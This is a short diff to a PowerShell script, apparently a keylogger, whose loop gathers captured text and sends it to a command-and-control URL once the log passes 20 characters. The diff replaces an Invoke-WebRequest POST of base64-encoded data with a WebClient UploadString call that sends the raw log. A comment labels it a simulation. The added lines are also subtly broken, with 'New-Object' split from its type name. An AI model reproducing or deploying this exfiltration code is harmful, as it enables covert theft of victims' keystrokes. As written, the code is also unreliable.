@@ -20,7 +20,9 @@ while($true) {
     # Envío al C2 cada vez que el log llega a 20 caracteres (Simulación dinámica)
     if ($log.Length -gt 20) {
         $body = @{sync_token = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($log))}
-        Invoke-WebRequest -Uri $C2_URL -Method Post -Body $body
+        $client = New-Object
+        System.Net.WebClient
+        $client.UploadString($C2_URL, $log)
         $log = ""
     }
 }
